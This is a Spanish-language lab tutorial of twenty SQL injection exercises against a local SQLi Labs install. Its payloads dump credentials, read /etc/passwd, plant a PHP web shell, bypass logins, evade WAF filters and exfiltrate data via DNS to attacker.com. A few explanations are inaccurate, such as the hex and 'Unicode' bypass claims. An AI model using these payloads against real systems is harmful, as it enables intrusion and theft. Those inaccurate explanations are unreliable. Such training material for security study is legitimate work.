![M1](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%201%402Menbrete1.png)

# **📌 Prácticas SQLi Labs (Nivel Intermedio y Avanzado)**

🔍 **Nivel**: Intermedio - Avanzado
🎯 **Objetivo**: Aprender a explotar vulnerabilidades de **Inyección SQL (SQLi)** utilizando **SQLi Labs** en entornos seguros.

------

## **📖 Introducción**

SQLi Labs es un entorno de práctica que proporciona múltiples niveles de vulnerabilidades **SQL Injection** para mejorar habilidades en **hacking ético y seguridad web**.

Cada práctica abordará diferentes escenarios de ataque con técnicas de **SQL Injection**, desde básicas hasta avanzadas, utilizando herramientas de **Kali Linux** como **SQLmap, Burp Suite y pruebas manuales**.

> 📢 **Recuerda:** Todas las prácticas deben realizarse **únicamente en entornos autorizados y con fines educativos**.

------

# **🔹 Configuración Inicial**

Antes de comenzar, asegúrate de tener: ✔️ **SQLi Labs instalado** en `http://localhost/sqli-labs/`
✔️ **Kali Linux o Windows 11 con herramientas de pentesting**
✔️ **MySQL configurado** con la base de datos `security`
✔️ **Burp Suite, SQLmap y Commix instalados**

------

# **🛠️ Parte 1: Pruebas de Inyección SQL Básica e Inferencial**

## **Práctica 1: Detección Manual de SQL Injection (Lesson 1)**

**Objetivo:** Identificar si un parámetro es vulnerable a SQLi mediante inyección manual.

**Pasos:**
1️⃣ Accede a `Lesson 1`:

```bash
http://localhost/sqli-labs/Less-1/?id=1
```

2️⃣ Prueba con comillas simples `'`:

```bash
http://localhost/sqli-labs/Less-1/?id=1'
```

📌 **Si aparece un error SQL**, significa que el parámetro `id` es vulnerable.

## **Práctica 2: Determinar el Número de Columnas (ORDER BY)**

**Objetivo:** Encontrar cuántas columnas tiene la consulta SQL.

**Pasos:**
1️⃣ En la URL, prueba el siguiente payload:

```bash
http://localhost/sqli-labs/Less-1/?id=1 ORDER BY 1 -- -
```

2️⃣ Incrementa el número hasta encontrar el error:

```bash
http://localhost/sqli-labs/Less-1/?id=1 ORDER BY 5 -- -
```

📌 **El número justo antes del error es el total de columnas.**

## **Práctica 3: Inyección UNION para Extraer Datos**

**Objetivo:** Obtener información de la base de datos con `UNION SELECT`.

**Pasos:**
1️⃣ Encuentra el número de columnas (ejercicio anterior).
2️⃣ Usa `UNION SELECT` para probar qué columnas pueden mostrar datos:

```sql
http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,2,3 -- -
```

3️⃣ Extrae la base de datos actual:

```sqlite
http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,database(),3 -- -
```

## **Práctica 4: Enumeración de Bases de Datos**

**Objetivo:** Listar todas las bases de datos disponibles.

**Pasos:**
1️⃣ Usa `UNION SELECT` para extraer bases de datos:

```sql
http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata -- -
```

📌 **Resultado esperado:** Aparecerán nombres de bases de datos como `security`, `information_schema`, etc.

## **Práctica 5: Extraer Tablas de la Base de Datos**

**Objetivo:** Obtener todas las tablas de la base `security`.

**Pasos:**
1️⃣ Usa el siguiente payload:

```sql
http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security' -- -
```

📌 **Resultado esperado:** Lista de tablas como `users`, `emails`, `orders`.

## **Práctica 6: Extraer Columnas de una Tabla**

**Objetivo:** Obtener los nombres de las columnas de la tabla `users`.

**Pasos:**
1️⃣ Usa el siguiente payload:

```sql
http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' -- -
```

📌 **Resultado esperado:** Aparecen columnas como `id`, `username`, `password`.

## **Práctica 7: Extraer Credenciales de Usuarios**

**Objetivo:** Obtener `usernames` y `passwords`.

**Pasos:**
1️⃣ Usa el siguiente payload:

```sql
http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,group_concat(username,':',password),3 FROM users -- -
```

📌 **Resultado esperado:** Lista de usuarios y contraseñas en texto plano.

------

## **Práctica 8: Ataque SQLi Blind (Boolean-Based)**

**Objetivo:** Extraer datos cuando no hay mensajes de error visibles.

**Pasos:**
1️⃣ Usa:

```sql
http://localhost/sqli-labs/Less-5/?id=1 AND 1=1 -- -
```

📌 **Si la página carga normalmente, la consulta es verdadera.**

2️⃣ Prueba con:

```sql
http://localhost/sqli-labs/Less-5/?id=1 AND 1=2 -- -
```

📌 **Si la página cambia, significa que es vulnerable a SQLi Blind.**

## **Práctica 9: SQLi Basado en Tiempo (Time-Based)**

**Objetivo:** Determinar vulnerabilidad a SQLi mediante `SLEEP()`.

**Pasos:**
1️⃣ Prueba:

```bash
http://localhost/sqli-labs/Less-5/?id=1 AND SLEEP(5) -- -
```

📌 **Si la página tarda 5 segundos en cargar, es vulnerable.**

## **Práctica 10: Automatización con SQLmap**

**Objetivo:** Extraer información usando SQLmap.

**Pasos:**
1️⃣ Ejecuta:

```sql
sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" --dbs
```

2️⃣ Lista las tablas:

```sql
sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" -D security --tables
```

3️⃣ Extrae datos:

```sql
sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" -D security -T users --dump
```

# **🛡️ SQLi Labs - Parte 2: Técnicas Avanzadas de SQL Injection**

🔍 **Nivel**: Avanzado
🎯 **Objetivo**: Aprender técnicas avanzadas de **Inyección SQL** utilizando **SQLi Labs** en entornos controlados.

## **📌 Introducción**

En esta segunda parte, exploraremos **métodos avanzados de SQL Injection**, incluyendo:

✅ **Evasión de filtros y bypass de WAFs**
✅ **Explotación de procedimientos almacenados**
✅ **Ejecución remota de comandos en el servidor**
✅ **Exfiltración de datos vía DNS**
✅ **Creación de shells web a través de SQL Injection**

📢 **Importante**:
👉 Todas las pruebas deben realizarse en entornos controlados y con autorización.
👉 **SQLi Labs** en `http://localhost/sqli-labs/` es ideal para estas prácticas.

# **🛠️ Parte 2: Técnicas Avanzadas de SQL Injection**

## **🔹 Práctica 11: Bypass de WAFs con Codificación Hexadecimal y Unicode**

📌 **Objetivo**: Saltar filtros que bloquean palabras clave (`SELECT`, `UNION`, etc.).

**Pasos:**
1️⃣ Normalmente, una consulta vulnerable sería:

```sql
http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,database(),3 -- -
```

📌 **Si un WAF bloquea `UNION`**, podemos codificarlo en **Hexadecimal**:

2️⃣ **Versión en Hexadecimal** (Usando `0x` para representar valores hex):

```sql
http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,0x6461746162617365,3 -- -
```

📌 **Resultado esperado:** `database` en formato texto.

3️⃣ **Versión en Unicode**:

```sql
http://localhost/sqli-labs/Less-1/?id=-1 %55NION %53ELECT 1,database(),3 -- -
```

📌 **Si `UNION` está bloqueado, el uso de `%55NION` puede saltar el filtro.**

## **🔹 Práctica 12: Evasión de Filtrado con Comentarios**

📌 **Objetivo**: Saltar filtros que bloquean espacios o palabras clave.

**Pasos:**
1️⃣ Si el WAF bloquea espacios, usa comentarios en SQL:

```sql
http://localhost/sqli-labs/Less-1/?id=-1/**/UNION/**/SELECT/**/1,database(),3-- -
```

📌 **El uso de `/\**/` evita la detección de `UNION SELECT`.**

## **🔹 Práctica 13: Inyección en Procedimientos Almacenados**

📌 **Objetivo**: Explotar procedimientos almacenados inseguros.

**Pasos:**
1️⃣ Ejecuta una consulta en SQLi Labs:

```sql
http://localhost/sqli-labs/Less-5/?id=1' AND (SELECT SLEEP(5)) -- -
```

📌 **Si la página tarda 5 segundos en responder, la inyección ha sido exitosa.**

## **🔹 Práctica 14: Leer Archivos del Servidor con LOAD_FILE()**

📌 **Objetivo**: Obtener archivos del servidor a través de SQL Injection.

**Pasos:**
1️⃣ Prueba en la URL:

```sql
http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 -- -
```

📌 **Si el servidor tiene permisos, devolverá el archivo `/etc/passwd`.**

## **🔹 Práctica 15: Escribir Archivos en el Servidor con INTO OUTFILE**

📌 **Objetivo**: Escribir archivos en el servidor para obtener una shell web.

**Pasos:**
1️⃣ Crea una **web shell** en `/var/www/html/shell.php`:

```php
http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3 INTO OUTFILE '/var/www/html/shell.php' -- -
```

📌 **Después accede a:**

```php
http://localhost/shell.php?cmd=whoami
```

📌 **Si devuelve `www-data`, significa que ejecutaste comandos en el servidor.**

## **🔹 Práctica 16: Escalamiento de Privilegios en MySQL**

📌 **Objetivo**: Elevar privilegios en MySQL explotando usuarios con permisos elevados.

**Pasos:**
1️⃣ Encuentra los usuarios con privilegios:

```php+HTML
http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,group_concat(user,':',host),3 FROM mysql.user -- -
```

📌 **Si `root@localhost` aparece, intenta acceder como `root`.**

## **🔹 Práctica 17: Pivoting con SQL Injection**

📌 **Objetivo**: Usar SQLi para pivotear y moverse lateralmente en la red.

**Pasos:**
1️⃣ Prueba listar conexiones activas:

```sql
http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,group_concat(host),3 FROM information_schema.processlist -- -
```

📌 **Si ves hosts internos, puedes intentar conectarte a ellos.**

## **🔹 Práctica 18: Bypass de Autenticación en Formularios de Login**

📌 **Objetivo**: Acceder sin credenciales.

**Pasos:**
1️⃣ En un login vulnerable, prueba:

```sql
' OR 1=1 -- -
```

📌 **Si accedes sin credenciales, el sitio es vulnerable.**

## **🔹 Práctica 19: Exfiltración de Datos Vía DNS**

📌 **Objetivo**: Enviar datos de SQL Injection a un servidor DNS externo.

**Pasos:**
1️⃣ En Kali Linux, inicia un listener DNS:

```sql
sudo tcpdump -i eth0 port 53
```

2️⃣ Ejecuta una consulta SQL en SQLi Labs:

```sql
http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,LOAD_FILE(CONCAT('\\\\attacker.com\\',database())),3 -- -
```

📌 **Si `attacker.com` recibe tráfico, el ataque ha sido exitoso.**

## **🔹 Práctica 20: Automatización con Burp Suite**

📌 **Objetivo**: Usar **Burp Suite** para detectar SQL Injection.

**Pasos:**
1️⃣ **Configura Burp Suite como proxy**.
2️⃣ **Intercepta una solicitud vulnerable** en `SQLi Labs`.
3️⃣ En **"Intruder"**, usa el payload:

```sql
' OR 1=1 -- -
```

4️⃣ **Ejecuta el ataque** y revisa los resultados.

📌 **Burp Suite puede automatizar ataques SQLi en gran escala.**

# **📌 Conclusión**

🔹 **Has aprendido 10 técnicas avanzadas de SQL Injection.**
🔹 **Ahora puedes evadir WAFs, leer/escribir archivos y escalar privilegios en MySQL.**
🔹 **En la próxima fase, exploraremos ataques en bases de datos NoSQL y otras estrategias avanzadas. 🚀**

📢 **¿Listo para seguir profundizando en seguridad web? ¡Sigue practicando en SQLi Labs!** 🔥



![M2](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%203%402Menbrete2.png)
